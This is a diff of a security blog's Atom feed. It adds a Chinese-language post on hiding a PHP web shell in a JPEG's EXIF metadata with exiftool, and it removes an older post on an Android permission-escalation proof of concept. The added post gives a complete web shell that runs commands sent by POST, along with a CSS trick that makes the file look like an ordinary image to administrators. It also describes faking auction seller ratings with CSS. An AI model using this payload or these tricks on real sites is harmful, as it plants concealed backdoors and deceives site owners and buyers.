@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Security | atdog's Blog]]></title>
   <link href="http://blog.atdog.org/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://blog.atdog.org/"/>
-  <updated>2013-05-11T09:03:01+08:00</updated>
+  <updated>2013-05-11T11:16:13+08:00</updated>
   <id>http://blog.atdog.org/</id>
   <author>
     <name><![CDATA[atdog]]></name>
@@ -12,6 +12,68 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[PHP Code Injection]]></title>
+    <link href="http://blog.atdog.org/blog/2013/05/11/php-code-injection/"/>
+    <updated>2013-05-11T10:50:00+08:00</updated>
+    <id>http://blog.atdog.org/blog/2013/05/11/php-code-injection</id>
+    <content type="html"><![CDATA[<p>先前提到的 <a href="/blog/2013/02/27/image-exif-tool/">Exiftool</a> 可以用來修改Image Metadata Tag的資料。</p>
+
+<p>但當網頁加入 .htaccess</p>
+
+<pre><code>AddHandler  application/x-httpd-php .jpg
+</code></pre>
+
+<p>會導致讀取 http://target/image.jpg 以html/txt去讀取，</p>
+
+<p>雖然因此能正確執行php，不過要是有其他使用者/管理者來檢查，</p>
+
+<p>發現讀取 http://target/image.jpg 都是亂碼，不就漏餡了嘛？</p>
+
+<p>如圖</p>
+
+<p><img src="/images/imageup1.png" title="image upload" alt="image upload" /></p>
+
+<p>所以就想了個trick來掩蓋這個問題，</p>
+
+<p>透過html css，將亂碼字設成透明，並加入&lt;img&gt;tag來讓圖片「看起來」是正常的</p>
+
+<pre><code>exiftool -DocumentName='&lt;?php if(!isset($_POST[cmd])) {echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";}else{passthru($_POST[cmd]);} __halt_compiler();?&gt;' apple.jpg
+</code></pre>
+
+<p>當中的PHP  code是這樣子的，</p>
+
+<pre><code>&lt;?php 
+    if(!isset($_POST[cmd])) {
+        echo "&lt;body style=\"color:rgba(0,0,0,0)\"&gt;"
+        echo "&lt;img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/&gt;&lt;/body&gt;";
+    }else{
+        passthru($_POST[cmd]);
+    } 
+    __halt_compiler();
+?&gt;
+</code></pre>
+
+<p>若直接瀏覽圖片網址，如圖，會顯示出一個圖片</p>
+
+<p><img src="/images/phpinject1.png" title="phpinjectimage" alt="phpinject1" /></p>
+
+<p>只有當 POST cmd=XX 到頁面上時，才會正確執行passthru($cmd)！</p>
+
+<p><img src="/images/phpinject2.png" title="phpinjectimage" alt="phpinject2" /></p>
+
+<hr />
+
+<p>其實這個想法就跟淘寶前陣子很多人在用的漏洞一樣，</p>
+
+<p>使用者可以自定義CSS，而導致透過CSS來假造賣家評價，來騙取使用者，</p>
+
+<p>前陣子我和<a href="http://blog.dm4.tw">dm4</a> 在Yahoo 拍賣也透過一樣的手法，</p>
+
+<p>來做過評價的偽裝，雖然簡單但可以騙取到不少使用者的信任。</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Image exif tool]]></title>
@@ -201,84 +263,6 @@ addhandler application/x-httpd-php .jpg
     <content type="html"><![CDATA[<p>There is the slide about sql injection that I presented with <a href="http://blog.dm4.tw">dm4</a> at the yahoo office.</p>
 
 <p><a href="https://www.dropbox.com/s/w1zyzkhofnzqfzh/sql-pure.pdf">SQL injection cheatsheet</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Android apps - Exploit poc]]></title>
-    <link href="http://blog.atdog.org/blog/2012/11/26/android-apps-exploit-poc/"/>
-    <updated>2012-11-26T02:43:00+08:00</updated>
-    <id>http://blog.atdog.org/blog/2012/11/26/android-apps-exploit-poc</id>
-    <content type="html"><![CDATA[<p>Google play - <a href="https://play.google.com/store/apps/details?id=com.texty.sms">MightyText</a></p>
-
-<p>Exploit - poc</p>
-
-<p>Malicious app can use this vulnerabililty to escape permission, it only need to request permissions READ_SMS and WRITE_SMS for gaining more privileges.</p>
-
-<p>Watch the video below!</p>
-
-<iframe width="560" height="315" src="http://www.youtube.com/embed/AbFuaKFJVyE" frameborder="0" allowfullscreen></iframe>
-
-
-<hr />
-
-<br>
-
-
-<p>then we found that another app <a href="https://play.google.com/store/apps/details?id=com.samsung.swift.app.kiesair">Kies Air</a> also had this vulnerabililty.</p>
-
-<br>
-
-
-<p>watch the video below</p>
-
-<iframe width="560" height="315" src="http://www.youtube.com/embed/ikVj8O99xWY" frameborder="0" allowfullscreen></iframe>
-
-
-<p>we can only use the permission READ_CONTACT and WRITE_CONTACT to escape permission. And we found that Kies Air requested lots of permissions (see below) when it was installed.These permissions could let the malware totally control your smartphone.</p>
-
-<pre><code>&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
-&lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;
-&lt;uses-permission android:name="android.permission.BROADCAST_STICKY" /&gt;
-&lt;uses-permission android:name="android.permission.CALL_PHONE" /&gt;
-&lt;uses-permission android:name="android.permission.CHANGE_WIFI_STATE" /&gt;
-&lt;uses-permission android:name="android.permission.GET_ACCOUNTS" /&gt;
-&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
-&lt;uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" /&gt;
-&lt;uses-permission android:name="android.permission.MODIFY_PHONE_STATE" /&gt;
-&lt;uses-permission android:name="android.permission.READ_CALENDAR" /&gt;
-&lt;uses-permission android:name="android.permission.READ_CONTACTS" /&gt;
-&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;
-&lt;uses-permission android:name="android.permission.READ_SMS" /&gt;
-&lt;uses-permission android:name="android.permission.READ_TASKS" /&gt;
-&lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /&gt;
-&lt;uses-permission android:name="android.permission.RECEIVE_SMS" /&gt;
-&lt;uses-permission android:name="android.permission.SEND_SMS" /&gt;
-&lt;uses-permission android:name="android.permission.SET_WALLPAPER" /&gt;
-&lt;uses-permission android:name="android.permission.SET_WALLPAPER_HINTS" /&gt;
-&lt;uses-permission android:name="android.permission.VIBRATE" /&gt;
-&lt;uses-permission android:name="android.permission.WAKE_LOCK" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_CALENDAR" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_CONTACTS" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_SETTINGS" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_SMS" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_TASKS" /&gt;
-&lt;uses-permission android:name="android.permission.READ_CALL_LOG" /&gt;
-&lt;uses-permission android:name="android.permission.WRITE_CALL_LOG" /&gt; 
-</code></pre>
-
-<hr />
-
-<br></br>
-
-
-<p>Bonus video - SMS Message Eavesdropping</p>
-
-<iframe width="560" height="315" src="http://www.youtube.com/embed/fxDmhErQxwk" frameborder="0" allowfullscreen></iframe>
-
-
-
 ]]></content>
   </entry>
   
